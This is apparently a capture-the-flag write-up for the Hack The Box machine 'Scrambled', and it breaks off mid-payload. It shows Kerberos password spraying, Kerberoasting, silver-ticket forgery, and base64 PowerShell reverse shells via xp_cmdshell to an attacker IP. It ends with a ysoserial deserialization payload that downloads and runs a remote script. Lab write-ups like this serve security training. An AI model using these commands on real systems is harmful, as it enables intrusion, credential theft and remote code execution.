ldapsearch -H ldap://10.10.11.168 -x\n# extended LDIF\n#\n# LDAPv3\n# base &lt;&gt; (default) with scope subtree\n# filter: (objectclass=*)\n# requesting: ALL\n#\n\n# search result\nsearch: 2\nresult: 1 Operations error\ntext: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera\n tion a successful bind must be completed on the connection., data 0, v4563\n\n# numResponses: 1\nport 9389:\n➜  scrambled nc 10.10.11.168 9389                \nhelp\nport 53:\n➜  scrambled host -t axfr scrm.local 10.10.11.168      \nTrying \"scrm.local\"\nUsing domain server:\nName: 10.10.11.168\nAddress: 10.10.11.168#53\nAliases: \n\nHost scrm.local not found: 5(REFUSED)\n; Transfer failed.\n➜  scrambled dig axfr scrm.local @10.10.11.168\n\n; &lt;&lt;&gt;&gt; DiG 9.18.1-1-Debian &lt;&lt;&gt;&gt; axfr scrm.local @10.10.11.168\n;; global options: +cmd\n; Transfer failed.\n\n\nStep 2 - Kerberoast\nWith all the “normal” enumeration coming up short, I decide to dig deeper into the hints from the webpage especially username and password being the same. We have the user ksimpson, lets try if his password is set to be the same.\n➜  /opt ./kerbrute_linux_amd64 passwordspray -d scrm.local --dc 10.10.11.168 /home/void/htb/scrambled/users.txt ksimpson \n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: v1.0.3 (9dad6e1) - 09/15/22 - Ronnie Flathers @ropnop\n\n2022/09/15 11:21:19 &gt;  Using KDC(s):\n2022/09/15 11:21:19 &gt;   10.10.11.168:88\n\n2022/09/15 11:21:19 &gt;  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson\nTesting Kerberoast fails:\n➜  scrambled impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-ip 10.10.11.168\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[-] (\"Unpacked data doesn't match constant value 'b''' should be ''NTLMSSP\\\\x00''\", 'When unpacking field \\' | \"NTLMSSP\\x00 | b\\'\\'[:8]\\'')\nTesting ASREPRoast fails:\n➜  scrambled impacket-GetNPUsers scrm.local/ -usersfile users.txt -format hashcat \nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User ksimpson doesn't have UF_DONT_REQUIRE_PREAUTH set\nTesting the credentials over SMB, WinRM and LDAP all fails as well.. I was stuck at this point for a while. Reviewing the enumerated data it finally clicked, all NTML authentication has been disabled. Instead lets try to generate a TGT and use that to authenticate instead.\n➜  scrambled impacket-getTGT scrm.local/ksimpson:ksimpson -dc-ip 10.10.11.168\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Saving ticket in ksimpson.ccache\nExport the ticket and lets try to Kerberoast again:\n➜  scrambled export KRB5CCNAME=ksimpson.ccache\n➜  scrambled impacket-GetUserSPNs scrm.local/ksimpson -k -no-pass -request -dc-ip 10.10.11.168\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[-] exceptions must derive from BaseException\nI’ve never seen this error before. Researching about it I find this git issue made by the box creator, VbScrub, explaining the issue. This has since been patched and they’ve added the flag -dc-host to mitigate the issue. Download the fresh script and run with -dc-host flag:\n➜  scrambled wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py\n\n➜  scrambled python GetUserSPNs.py scrm.local/ksimpson -k -no-pass -dc-ip 10.10.11.168 -dc-host dc1.scrm.local -request -outputfile krb.hash\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\nServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation \n----------------------------  ------  --------  --------------------------  --------------------------  ----------\nMSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 17:32:02.351452  2022-09-15 09:27:04.762825             \nMSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 17:32:02.351452  2022-09-15 09:27:04.762825  \n\n➜  scrambled cat krb.hash \n$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$4b6ea2059c13cd55ea179c99769420a2$d6a24837673cc0774a4f9ff2037dcc4d9673e58d019f87e1559ff71237f0af0bb2ece0909fbe34da3ec1374722d8252cec867d193454c3f3ed07bec39662318bdc1c538969b19ec0647a924fc9d927e0bb92f796426a7df56e2127b9db9f12f8a78fa5ae6f15524c1849567b2a2d756358891a514ef9ec50cc8fd8e494420e34be9de2df5002f69f38c75a5638ab7a1bb0f3f67a04e9247813381ce075cc2ac7d6388dedc3f2106b3eb029b019793333160cee7014499c1c4da9400ac84404d6671378d808cf6ad9962f7bc4de7a9e1082b064af72ba4aef26d5a15f3289a03f3edbde1a5b94ceba24ef98f18a316301fc5b5bd76d23056d8d6217a8b3684f07db2255f8fc733f570ef228021b373312c2325a0e3b203b3bd2ad0b408630ae2597458b9c70a9edd0b29810b3263664cd447dc139bbedf64dc6fe1a0473202569abc3837ffa15d4d199d63d476afd10db6ef64a187976b5e0713d225adac86360f937b97b5be092e167633b60e7eb3b3266e5bd9ababf1aac068248f2dce6f9c2f2fe2c45958f0d41c722c3734e4dcde7b8e90a3a0d39ed5ba02801a66f76bc7e63d85b62f3b8c823a0169cba9b019d11ea31170c6e6afe4a1f5ad122953b8f7debf980b88505914f0193235be2a082fea598052a99475e6ee717aa75deb1560b4dee38d4c5a95ef9c98212b39493506cea39aa07808995e4ddd19ef96339d33df09b72d7b57c98aa2c53e43ba4062e71897228df12bce7c0ff6bc9d0ddb01c873ee760700a9aee6ffa5cc84307938d14d81ef55ffe369b807da870c2d99dbe51c78fadbcbf4affbb749e3d8ef165da194a1218d3d0616771c7c059350b65a7bbd8cf56684e86e721b9ebac1459c50d0ff49c2ca5ab75122d22c9be24e97d4e4e520e278dd0b2ee34ce070e1feb49626c279e27c18e94a29bddd777491bcd1559285c5e39064def9aacbeae5bb1172c552538d6d421360eb6af3ba2c846a6688cce09f0c26535f6ca1caf9bafb0eb1eb935703102b31e0e59436a3dcc1214e222e261637ff50658acc114b7f0442b3c51543a87e359cc58e0854defd6c5470cc048710c97915747a61a8fa750fcf23743500fada571368dfd5fc49e912f69036ab1d9d4326bf03d88f69048c3933c990661f6435227dae066b29486ff046c8e351d4a6e5ca6676ebd2e7eff30aa0a6a7370ca1e816865be8a7146e569e972410175ffeab4ae1571c9e2e423c981663686f9aa591a074237d36f3eca8d6355ebddb29c10c2ecee28c066ba292e25e4a04a4db725083554c7aabea36342a6a01900e018673ec1d2fd6296fc03662f7b085bbdc2b166580a9cdfb682cfe50392f8146fd87357672bc80016f2756e26bb1237b06942357595f2d3d96b9340efa5f371a2f94d709ca1a80dd37cdc89963c3b06d2c2304d0b92f24ed231b3\nCrack it:\n➜  scrambled hashcat -a0 -m13100 krb.hash /usr/share/wordlists/rockyou.txt\n\n$krb5tgs$23$*sqlsvc$...:Pegasus60\n                                                          \nSession..........: hashcat\nStatus...........: Cracked\nNotice the username sqlsvc, we’ve just cracked credentials for SQL - sqlsvc:Pegasus60\n\n\nStep 3 - More secrets\nWe’ve got a username, TGT and password, meaning now we should be able to enumerate more services. Trying to enumerate SMB with smbclient fails:\n➜  scrambled smbclient scrm.local/ksimpson:ksimpson@dc1.scrm.local -k --dc-ip 10.10.11.168\n\nscrm.local\\ksimpson:ksimpson@dc1.scrm.local: Not enough '\\' characters in service\nHowever, downloading and using smbclient.py works just fine:\n➜  scrambled wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbclient.py\n➜  scrambled python smbclient.py scrm.local/ksimpson:ksimpson@dc1.scrm.local -k -dc-ip 10.10.11.168 \nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\nType help for list of commands\n# shares\nADMIN$\nC$\nHR\nIPC$\nIT\nNETLOGON\nPublic\nSales\nSYSVOL\nLook around and download potentially interesting files.\n# use Sales\n[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)\n# use IT\n[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)\n# use HR\n[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)\n# use Public\n# ls\ndrw-rw-rw-          0  Thu Nov  4 23:23:19 2021 .\ndrw-rw-rw-          0  Thu Nov  4 23:23:19 2021 ..\n-rw-rw-rw-     630106  Fri Nov  5 18:45:07 2021 Network Security Changes.pdf\n# get Network Security Changes.pdf\n\nThe first vulnerability we already knew about since it was made public on the intranet (port 80), however the SQL information is new. This sounds perfect for us, as we just extracted and cracked the TGT for user sqlsvc - how do we exploit this?\n\n\nStep 4 - Silvet Ticket\nReading about Silver ticket attacks the requirements are knowledge of:\n\nDomain Name = scrm.local\nDomain SID = unknown, should be able to find\nUsername to impersonate = administrator\nkrbtgt NTLM hash = not sure, but we have the password Pegasus60 so should be able to generate it\n\nI know we can find Domain SID through rpcclient so lets try that first:\n➜  scrambled rpcclient dc1.scrm.local -k --no-pass\nCannot connect to server.  Error was NT_STATUS_NO_LOGON_SERVERS\nImpackets lookupsid don’t have an option to connect using kerberos so that’s a no-go as well..\n➜  scrambled impacket-lookupsid scrm.local/ksimpson:ksimpson@dc1.scrm.local\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Brute forcing SIDs at dc1.scrm.local\n[*] StringBinding ncacn_np:dc1.scrm.local[\\pipe\\lsarpc]\n[-] SMB SessionError: STATUS_NOT_SUPPORTED(The request is not supported.)\n\n➜  scrambled impacket-lookupsid scrm.local/sqlsvc:Pegasus60@dc1.scrm.local\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Brute forcing SIDs at dc1.scrm.local\n[*] StringBinding ncacn_np:dc1.scrm.local[\\pipe\\lsarpc]\n[-] SMB SessionError: STATUS_NOT_SUPPORTED(The request is not supported.)\nReading about the TGT I find this image:\n\nAs shown the TGT contains Privilege Attribute Certificate (PAC) which is used for authorization purposes. The PAC contains user and group membership information, but also the domain SID. We can request PAC for a user from the DC using Impackets getPac script.\n➜  scrambled impacket-getPac -targetUser ksimpson scrm.local/ksimpson:ksimpson\n[... snip ...]\nDomain SID: S-1-5-21-2743207045-1827831105-2542523200\n\n➜  scrambled impacket-getPac -targetUser sqlsvc scrm.local/sqlsvc:Pegasus60\n[... snip ...]\nDomain SID: S-1-5-21-2743207045-1827831105-2542523200\nLastly we need the NTLM hash, simply generate it with what ever online generator you find. Pegasus60 -&gt; B999A16500B87D17EC7F2E2A68778F05\nTo make a summary we now have everything to create our ticket:\n\nDomain Name = scrm.local\nDomain SID = S-1-5-21-2743207045-1827831105-2542523200\nUsername to impersonate = administrator\nkrbtgt NTLM hash = B999A16500B87D17EC7F2E2A68778F05\n\n➜  scrambled impacket-ticketer -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -user-id 500 Administrator\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for scrm.local/Administrator\n[*]     PAC_LOGON_INFO\n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n[*]     EncAsRepPart\n[*] Signing/Encrypting final ticket\n[*]     PAC_SERVER_CHECKSUM\n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncASRepPart\n[*] Saving ticket in Administrator.ccache\nTesting to connect to the MsSQL service we fail, even though we exported the ticket..\n➜  scrambled export KRB5CCNAME=Administrator.ccache\n➜  scrambled impacket-mssqlclient dc1.scrm.local -k\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Encryption required, switching to TLS\n[-] Kerberos SessionError: KRB_AP_ERR_BAD_INTEGRITY(Integrity check on decrypted field failed)\nI got stuck here for a while before I noticed that I forgot the SPN when creating my impersonated Administrator ticket. Reading the Microsoft docs the SPN format is MSSQLSvc/fqdn, so lets re-create the ticket.\n➜  scrambled impacket-ticketer -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn MSSQLSvc/dc1.scrm.local -user-id 500 Administrator\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for scrm.local/Administrator\n[*]     PAC_LOGON_INFO\n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Signing/Encrypting final ticket\n[*]     PAC_SERVER_CHECKSUM\n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Saving ticket in Administrator.ccache\n\n➜  scrambled export KRB5CCNAME=Administrator.ccache\n➜  scrambled impacket-mssqlclient dc1.scrm.local -k\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC1): Line 1: Changed database context to 'master'.\n[*] INFO(DC1): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL&gt; \nIt works! We’re connected to the SQL Service.\n\n\nStep 5 - MSSQL\nEnumerate the SQL Service:\nSQL&gt; SELECT name FROM master..sysdatabases;\nname                                                                                                                               \n--------------------------------------------------------------------------------------------\nmaster                                                                                                                             \ntempdb                                                                                                                             \nmodel                                                                                                                              \nmsdb                                                                                                                               \nScrambleHR\n\nSQL&gt; use ScrambleHR\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR\n[*] INFO(DC1): Line 1: Changed database context to 'ScrambleHR'.\n\nSQL&gt; select table_name from information_schema.tables\ntable_name                                                                                                                         \n-------------------------------------------------------------------------------------------- \nEmployees                                                                                                                          \nUserImport                                                                                                                         \nTimesheets \n\nSQL&gt; select * from UserImport\nLdapUser                                             LdapPwd                                              LdapDomain                                           RefreshInterval   IncludeGroups   \n\n--------------------------------------------------   --------------------------------------------------   --------------------------------------------------   ---------------   -------------   \n\nMiscSvc                                              ScrambledEggs9900                                    scrm.local                                                        90               0   \nA new set of credentials: MiscSvc:ScrambledEggs9900\nLets step it up and see if we can enable and execute commands with xp_cmdshell:\nSQL&gt; enable_xp_cmdshell\nSQL&gt; whoami\nscrm\\sqlsvc\nInstead of uploading nc64.exe or similar we can just use revshells.com PowerShell #3 (Base64) to get a quick and simple shell.\n\nSQL&gt; xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAiACwANAA0ADgAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=\n➜  scrambled nc -lvnp 4488\nlistening on [any] 4488 ...\nconnect to [10.10.14.7] from (UNKNOWN) [10.10.11.168] 64463\nPS C:\\Windows\\system32&gt; whoami\nscrm\\sqlsvc\nPS C:\\Users\\sqlsvc\\Desktop&gt; ls\nPS C:\\Users&gt; ls  \nMode                LastWriteTime         Length Name                                                                  \n----                -------------         ------ ----                                                                  \nd-----       05/11/2021     21:28                administrator                                                         \nd-----       03/11/2021     19:31                miscsvc                                                               \nd-r---       26/01/2020     17:54                Public                                                                \nd-----       01/06/2022     14:58                sqlsvc \nThe user-flag is not possession of sqlsvc, so we probably need to pivot to miscsvc. I like to do this using below commands:\nPS C:\\Users&gt; $user = 'scrm.local\\miscsvc'\nPS C:\\Users&gt; $pass = 'ScrambledEggs9900' | ConvertTo-SecureString -AsPlainText -Force\nPS C:\\Users&gt; $creds = New-Object System.Management.Automation.PSCredential($user,$pass)\nPS C:\\Users&gt; Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { whoami }\nscrm\\miscsvc\nGenerate a new reverse shell from revshells.com and fire:\nPS C:\\Users&gt; Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAiACwANAA0ADkAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA= }\n➜  scrambled nc -lvnp 4499\nlistening on [any] 4499 ...\nconnect to [10.10.14.7] from (UNKNOWN) [10.10.11.168] 61678\n\nPS C:\\Users\\miscsvc\\Documents&gt; whoami\nscrm\\miscsvc\nPS C:\\Users\\miscsvc\\Desktop&gt; ls\nMode                LastWriteTime         Length Name                                              \n----                -------------         ------ ----                                              \n-ar---       15/09/2022     08:26             34 user.txt\nPS C:\\Users\\miscsvc\\Desktop&gt; type user.txt\n5fcdc64885d9b2497f0bb5b97c4650f6\n\n\n\n\nROOT\n\nStep 1 - More enumeration\nLooking on miscsvc’s privileges nothing stands out, however there are two custom groups added.\nPS C:\\Users\\miscsvc&gt; whoami /all\n[... snip ...]\nSCRM\\ITShare                                Group            S-1-5-21-2743207045-1827831105-2542523200-1609 Mandatory group, Enabled by default, Enabled group\nSCRM\\ITUsers                                Group            S-1-5-21-2743207045-1827831105-2542523200-1610 Mandatory group, Enabled by default, Enabled group\nThere is no PowerShell history:\nPS C:\\Users\\miscsvc\\AppData\\Roaming\\Microsoft\\Windows&gt; Get-Childitem -force\nMode                LastWriteTime         Length Name                                              \n----                -------------         ------ ----                                              \nd-----       15/09/2018     08:19                CloudStore                                        \nd-----       15/09/2018     08:19                Network Shortcuts                                 \nd-----       15/09/2018     08:19                Printer Shortcuts                                 \nd-r---       15/09/2018     08:19                Recent                                            \nd-r---       15/09/2018     08:19                SendTo                                            \nd-r---       15/09/2018     08:19                Start Menu                                        \nd-----       15/09/2018     08:19                Templates\nTesting to analyze the AD with SharpHound is unsuccessful, no output is provided:\nPS C:\\Temp&gt; curl http://10.10.14.7/SharpHound.exe -o C:\\Temp\\SharpHound.exe \nPS C:\\Temp&gt; curl http://10.10.14.7/SharpHound.ps1 -o C:\\Temp\\SharpHound.ps1\nPS C:\\Temp&gt; ls\nMode                LastWriteTime         Length Name                                              \n----                -------------         ------ ----                                              \n-a----       15/09/2022     14:15        1051648 SharpHound.exe\n-a----       15/09/2022     14:20        1318097 SharpHound.ps1 \n\nPS C:\\Temp&gt; SharpHound.exe -CollectionMethod All -Domain scrm.local -LDAPUser miscsvc -LDAPPass ScrambledEggs9900\nPS C:\\Temp&gt; SharpHound.ps1 -CollectionMethod All -Domain scrm.local -LDAPUser miscsvc -LDAPPass ScrambledEggs9900\nWe find the custom directory C:\\Program Files\\ScrambleCorp however it’s empty.. This took me way to long to find, but we’re now able to enumerate the SMB shares under C:\\Shares.\nPS C:\\Shares\\IT&gt; ls\nMode                LastWriteTime         Length Name                                              \n----                -------------         ------ ----                                              \nd-----       03/11/2021     21:06                Apps                                              \nd-----       03/11/2021     19:32                Logs                                              \nd-----       03/11/2021     19:32                Reports \n\nPS C:\\Shares\\IT\\Apps\\Sales Order Client&gt; ls\nMode                LastWriteTime         Length Name                                              \n----                -------------         ------ ----                                              \n-a----       05/11/2021     20:52          86528 ScrambleClient.exe                                \n-a----       05/11/2021     20:52          19456 ScrambleLib.dll \nAn interesting .exe and .dll in a path that’s unquoted, this is interesting! Download the two files to your attacking machine.\nBeing unable to download the files using nc.exe/nc64.exe I setup a local SMB Server out of desperation:\n➜  share sudo adduser --system shareuser\nAdding system user `shareuser' (UID 130) ...\nAdding new user `shareuser' (UID 130) with group `nogroup' ...\nCreating home directory `/home/shareuser' ...\n\n➜  /srv sudo mkdir share\n➜  /srv sudo chmod 777 share\n➜  /srv sudo chown -R shareuser:nogroup /srv/share\n➜  /srv sudo vim /etc/samba/smb.conf\n➜  /srv cat /etc/samba/smb.conf\n[global]\n   client min protocol = SMB2\n   client max protocol = SMB3\n\n[share]\n  path = /srv/share\n  writable = yes\n  browsable = yes\n  public = yes\n  create mask = 0644\n  directory mask = 0755\n  force user = shareuser\n\n➜  /srv service smbd restart\n\nPS C:\\Temp&gt; echo \"test\" &gt; \\\\10.10.14.7\\share\\test\nI doesn’t work either… being a bit annoyed I opted towards certutil.exe and encoded the files and copy-pasted them.\nPS C:\\Temp&gt; certutil.exe -encode ScrambleClient.exe ScrambleClient.exe.b64\nInput Length = 86528\nOutput Length = 119034\nCertUtil: -encode command completed successfully.\n\nPS C:\\Temp&gt; certutil.exe -encode ScrambleLib.dll ScrambleLib.dll.b64\nInput Length = 19456\nOutput Length = 26812\nCertUtil: -encode command completed successfully.\n\n➜  scrambled vim ScrambleClient.exe.b64\n➜  scrambled vim ScrambleLib.dll.b64\n\n➜  scrambled cat ScrambleClient.exe.b64| base64 -d &gt; ScrambleClient.exe\n➜  scrambled cat ScrambleLib.dll.b64| base64 -d &gt; ScrambleLib.dll\n\n\nStep 2 - Dig deep with ilspy / DNSpy\nAnalyze .exe and .dll with ilspy or DNSpy in a Windows VM. Briefly looking over the .dll we find static methods for serializing and deserializing data:\n\nThis is a big red flag for me as deserialization often leads to juicy input vulnerabilities. Reading about .NET BinaryFormatter vulnerabilities I find this post from Microsoft confirming my thoughts, and this medium post showing how we can exploit this.\nBut before we get into exploiting, we need to identify a method that handles input data. There is one method that looks promising - UploadOrder(SalesOrder). Analyzing UploadOrder(SalesOrder) we see that the input string is not parameterized or handled in anyway before it’s sent to the method SerializeToBase64().\n\nWe should be able to exploit this with ysoserial.exe to get code execution. Generate a reverses shell payload just like earlier and create the payload using ysoserial.exe:\nPS C:\\tools\\ysoserial-1.35\\Release&gt; .\\ysoserial.exe -f BinaryFormatter -o base64 -g WindowsIdentity -c \"powershell -e JABjAGwAaQ...\"\nAAEAAAD/////AQ...\nUpload the new order:\n➜  scrambled nc scramble.htb 4411\nSCRAMBLECORP_ORDERS_V1.0.3;\nUPLOAD_ORDER;AAEAAAD/////AQ...\nERROR_GENERAL;Error deserializing sales order: Invalid length for a Base-64 char array or string.\nNot sure if this fails because we’re using the base64 payload, lets try a simpler payload.\nPS C:\\tools\\ysoserial-1.35\\Release&gt; .\\ysoserial.exe -f BinaryFormatter -o base64 -g WindowsIdentity -c \"powershell iex(new-object system.net.webclient).downloadstring('http://10.10.14.7/rev.ps1')\"\nAAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAAuApBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBaWdZOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUhCdmQyVnljMmhsYkd3Z2FXVjRLRzVsZHkxdlltcGxZM1FnYzNsemRHVnRMbTVsZEM1M1pXSmpiR2xsYm5RcExtUnZkMjVzYjJGa